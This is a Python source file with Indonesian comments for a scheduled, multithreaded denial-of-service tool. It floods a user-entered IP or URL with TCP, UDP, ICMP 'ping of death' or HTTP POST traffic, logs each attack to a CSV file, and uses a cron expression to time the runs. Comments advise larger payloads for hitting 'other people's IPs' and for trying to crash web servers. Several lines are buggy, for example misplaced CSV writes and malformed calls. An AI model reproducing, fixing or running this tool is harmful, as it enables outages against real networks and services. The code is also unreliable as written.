import socket # mebuat koneksi ke server atau klien
import threading #membuat agar semua proses bekerja secar bersama / langsung tanpa harus 1 proses selesai baru proses lainya
import random #membantu apa yg diinginkan user scara random misalkan data, ip, port dll
import time #membantu memberikan waktu jeda pada kode
import schedule #untuk membantu membuat automation pada kode
import sys #baca argumen ketika run program
from scapy.all import IP, ICMP, send # modul yang salah satunya mempermuda pada koneksi jaringan
from croniter import croniter #untuk fitur cron job sehingga mmengikuti waktu dari inputan user
import datetime #untuk adanya penggunaan waktu dan tanggal yang kemudian dikolaborasikan dengan schedule agar automtion pada waktu itu kode berjalan
import requests #untuk menngunak atau akses ke http tanpa perlu koneksi
import csv #agar sebagai report, telah melakukan apa pada kode ini seperti penggunaan atack pada packet apa, ke ip mana dan port berapa

target_type = input("[+] Choose target type (IP/HTTP): ").lower() #membuat suatu fungsi / argumen agar user memiliki pilihan pilih ip atau http
                                                                    #lower akan membantu jika menginput dengan huruf besae

if target_type == "ip":
    ip = str(input("[+] Insert target’s IP: "))
    port = int(input("[+] Insert Port: "))
    target_address = (ip, port)
elif target_type == "http":
    url = str(input("[+] Insert target’s URL: "))
    target_address = (url, 80)
else:
    print("Invalid target type. Please choose 'ip' or 'http'.")
    sys.exit()
#program meminta alamat IP dan port jika target berupa IP, atau meminta URL jika target berupa HTTP. 
#Informasi ini disimpan dalam variabel target_address yang berisi tupel (alamat, port).

pack = int(input("[+] packets: ")) #mentukan jumlah packet yg dikrim yang artinya jika 1 pack 1000 , jika 2 pack berarti jummlahkan yg samma

#file_path = input("[+] Insert path to the text file: ") # => ini opsional jika payload udp dan tcp tidak mau random, bisa dengan model upload file

thread_count = int(input("[+] Insert number of Threads: ")) #tugas melakukan threading
choice = input("[+] Choose protocol (TCP/UDP/ICMP/http): ").upper()

def generate_fake_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def send_file(filename): #jika ingin random data tinggal maka fungsi send_file di # aja, kalo mau pake file fisik ganti dengan payload
    try:
        with open(filename, "rb") as file:
            while True:
                content = file.read(1000) #file txt atau csv saja di upload, size file ditentukan dimana saya buat 1000 sehingga paket fisik haru sizienya 1000 ke bawah, masalahnya akan memakan memory makanya mending urandom aja jadi modul yang buat snediri lengthnay sebanyaknya
                if not content:
                    break
                content(content)
    except:
        print("Error reading file:")

def start_tcpflooding(): #Tcpflood
    
    # beberapa hedaer palsu bisa digunakan jika tidak menyerang pada protokol jaringan (udp/icmp/dns) melaikan permintaan http
    filebyte = random._urandom(10) #jika mau lebih efisien maka ukuran datanya dari 10 ubah ke 7000 minimal
    fake_ip = generate_fake_ip() 
    data = filebyte + fake_ip.encode('utf-8')
    attack = 0
    
    with open('attack_results.csv', 'w', newline='') as csvfile:
        fieldnames = ['Target', 'Attack_Count']
        csvwriter = csv.DictWriter(csvfile, fieldnames=fieldnames)
        csvwriter.writeheader()
        
        while True:
            try:
                fake_ip = generate_fake_ip()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_address))
                s.send(data)
                for _ in range(pack):
                    s.send(data)
                attack += 1
                print("Attacking {0} | Sent: {1} | From: {2}".format(str(target_address), attack, fake_ip)) #output dengan memberikan informasi attack kemudian alamat IP target, port, dan jumlah serangan yang telah dilakukan, serta menunjukan apakah ip fake betulan ada.
                csvwriter.writerow({'Target': str(target_address), 'choice': input(start_tcpflooding,start_udpflooding,icmp_pingofdeath) , 'Attack_Count':attack})
            except:
                s.shutdown()
                s.close()
                print('RTO')
   
def start_udpflooding(): #Udpflood
    filebyte = random._urandom(10) #jika mau lebih efisien maka ukuran datanya dari 10 ubah ke 7000 minimal
    fake_ip = generate_fake_ip() 
    data = filebyte + fake_ip.encode('utf-8')
    attack = 0

    with open('attack_results.csv', 'w', newline='') as csvfile:
        fieldnames = ['Target', 'Attack_Count', 'size_pack']
        csvwriter = csv.DictWriter(csvfile, fieldnames=fieldnames)
        csvwriter.writeheader()

        while True:
            try:
                fake_ip = generate_fake_ip()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, target_address)
                for _ in range(pack):
                    s.sendto(data,target_address)
                    
                attack += 1
                print("Attacking {0}:{1} | Sentsize: {2} | From: {3}".format(str(target_address, attack), pack, fake_ip)) #output dengan memberikan informasi attack kemudian alamat IP target, port,jumlah serangan yang telah dilakukan, dan ip
                csvwriter.writerow({'Target': str(target_address), 'choice': input(start_tcpflooding,start_udpflooding,icmp_pingofdeath) , 'Attack_Count':attack, 'size_pack':pack})
            except Exception as e:
                print( str(e))     #agar pada output disampaikan peyebab jika error karena udp masi suka error saat code dijalankan

            finally:
                s.shutdown()
                s.close()
                print('RTO')

#def icmp_send():
#    ping_of_death = IP(" ping l 6550") / ICMP()
#    send(pack * ping_of_death)
def icmp_pingofdeath(): # untuk metode ke tiga ini melaakukan metode ping death, dimana melakukan ping sebanyak mungkin
    fake_ip = generate_fake_ip()
    print("Fake ip address:", fake_ip)
    size = int(300) #ubah size ke 7000 jika mau ke ip orang lain, kalau untuk uji coba 300 aja
    ping = ( 'down' * size)

    with open('attack_results.csv', 'w', newline='') as csvfile:
        fieldnames = ['Targetping','Attack_Count', 'Sendsize']
        csvwriter = csv.DictWriter(csvfile, fieldnames=fieldnames)
        csvwriter.writeheader()

    ping_of_death = IP(dst=ip)/ ICMP() /ping # saya buat dst hanya ip, karena ping tidak perlu port tetapi berfokus ke (url dan ip)
    
    while True:
        for _ in range(pack):
            send(ping_of_death* pack, verbose=0)
            csvwriter.writerow({'Target': str(ip), 'choice': input(start_tcpflooding,start_udpflooding,icmp_pingofdeath) , 'Attack_Count':pack,'SendSize':size})
            print('ping' + ip + 'preload (-c)' + str(pack) + ' Size (-S) ' + str(size) )
        
    pass



def http_flood():
#kode akan segera dimasukan karena outputnya baik get mmasi 200 & 400 dan pada post 400, sehingga masi cari cara apa yang bisa membeani server hingga status code 500
#kemudian jika ingin post ke web besar maka kalian harus mengethaui api dari web tersebut  
    web_device_agent = ['Mozilla/5.0 (X11; CrOS x86_64 10066.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0.']
    web_reference = ['https://www.torproject.org/','https://www.youtube.com/',
                 'https://www.google.com/', 'https://id.search.yahoo.com/?fr2=p:fprd,mkt:id',
                    'https://web.telegram.org/k/']
    
    # jika mempeljari http konsep maka konsep masi banyak lagi ada cookie, refrece dll 
    #nah disini kita isikan dengan informasi palsu seperi user agent perangkat orang lain
    
                     
    target = url
    header = {'user-agent': web_reference[0] + ' ' + web_device_agent[0]}
    filebyte = random._urandom(10) #saya gunakan jika untuk post bukan get, tetapi hasil respon masi 400 blom 500

    while True:  
        try:
            for _ in range(pack):
                response = requests.post(target, data=filebyte, headers=header) #jika main post outputnya masi 400 bukan 500, sedangakan get tetap 200 dan belom down
                print(f"HTTP Response:{response.status_code}")
                
        except:
            print("STOP")

    pass
def main():
    for _ in range(thread_count):
        if choice == 'TCP':
            #payload = send_file(file_path)
            thread = threading.Thread(target=start_tcpflooding)#, args=(payload,))
            thread.start()
        elif choice == 'UDP':
            #payload = send_file(file_path)
            thread = threading.Thread(target=start_udpflooding)#, args=(payload,))
            thread.start()
        elif choice == 'ICMP':
            thread = threading.Thread(target=icmp_pingofdeath)
            thread.start()
        elif choice == 'HTTP':
            thread = threading.Thread(target= http_flood)
            thread.start()
        else:
            print("Invalid protocol choice. Please choose 'TCP' or 'UDP' or 'http' or 'icmp'.")
            sys.exit()
    #for i in range(thread_count):
     #   if start_tcpflooding  =='A':
      #      thread = threading.Thread(target=start_tcpflooding)
       #     thread.start()
       # else:
        #    thread = threading.Thread(target=start_udpflooding)
         #   thread.start()

#fungsi main pada kode diatas yang  digunakan untuk menjalankan serangan DoS 
#dengan menggunakan sejumlah thread sesuai dengan jumlah yang diminta oleh pengguna.
         
def schedule_job(cron_expression):
    cron_iterator = croniter(cron_expression)
    next_execution_time = cron_iterator.get_next(datetime.datetime)
    schedule.every().day.at(next_execution_time.strftime("%H:%M")).do(main)
#strftime
# Meminta input waktu dari pengguna, sebagai informasi waktu kapan kode dijalankan dengan format cron job
user_input = input("Masukkan waktu eksekusi (format cron): ")

# Memanggil fungsi untuk menjadwalkan tugas berdasarkan input pengguna
schedule_job(user_input)


#schedule.every().day.at("20:00").do(job) # membuat automation dengan modul sechedule dimna kode akan running setiap hari flooding pas jam 8:00 malam

while True:
    schedule.run_pending()
    time.sleep(5) #jika menggunakan cron job saya sarankan tak usah menggunakan metode looping dan sleep ini 
                  # kecuali menggunakan modul schedule wajib apalagi jika kita membuat schedule lebih dari 1, maka
                  # fungsi lloping while true ini dapat membantu untuk memeriksa setiap jadwal yang berbeda yang telah diurutkan user secara berulang 
    userinput = input("pencet  'z' dan Enter untuk keluar: ") 
    if userinput.lower() == 'z':
        break


